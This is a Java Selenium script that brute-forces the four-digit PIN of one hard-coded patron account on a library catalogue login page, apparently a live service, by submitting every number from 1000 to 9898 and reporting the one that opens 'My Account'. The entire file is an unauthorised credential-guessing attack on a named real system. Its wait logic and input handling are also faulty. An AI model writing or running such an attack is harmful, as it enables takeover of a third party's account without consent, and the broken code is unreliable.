package BruteForce;

import java.util.concurrent.TimeUnit;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.ie.InternetExplorerDriver;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;

public class BruteForce
{
	String url;
	//String formID;
	String[] inputIDs;
	String username;
	
	public BruteForce(String url, /*String formID,*/ String[] inputIDs, String username)
	{
		this.url = url;
		//this.formID = formID;
		this.inputIDs = inputIDs; //username, password
		this.username = username;
		
		WebDriver driver = new InternetExplorerDriver();
		
		System.out.println("CHECKPOINT 1");
		
		driver.get(url);
		
		driver.manage().timeouts().implicitlyWait(10, TimeUnit.SECONDS);
		
		//initialWait.until(ExpectedConditions.titleIs("Log In"));
		
		WebElement usernameElement = driver.findElement(By.cssSelector(inputIDs[0]));
		WebElement passwordElement = driver.findElement(By.cssSelector(inputIDs[1]));
		
		WebDriverWait wait = new WebDriverWait(driver, 5);
		
		int correctPIN = 0;
							//4, implicit wait		explicit- wait until title is My Account
		
		System.out.println("CHECKPOINT 2");
		
		for (int i = 1000; i < 9899; i++)
		{
			usernameElement.sendKeys(username);
			passwordElement.sendKeys("" + i);
			usernameElement.submit();
			
			System.out.println("Testing " + username + "/" + i + "...");
			
			wait.until(ExpectedConditions.titleIs("My Account"));
			
			if (wait.until(ExpectedConditions.titleIs("My Account")))
			{
				correctPIN = i;
				System.out.println("Found at " + i);
				break;
			}
		}
		
		System.out.println("The correct PIN is " + correctPIN);
	}

	public static void main(String[] args) throws Exception
	{
		System.setProperty("webdriver.ie.driver", "D:\\Data\\Dev\\Eclipse2018-2019\\Projects\\src\\BruteForce\\IEDriverServer.exe");
		
		String url = "https://lmac.ent.sirsi.net/client/en_US/"
				+ "lmxac/search/patronlogin/http:$002f$002f"
				+ "lmac.ent.sirsi.net$002fclient$002fen_US"
				+ "$002flmxac$002fsearch$002faccount$003f/";
		//String formID = "loginPageForm";
		String[] inputIDs = {"user_name_input", "password_input"};
		String username = "29304004001581";
		
		new BruteForce(url, /*formID,*/ inputIDs, username);
	}
}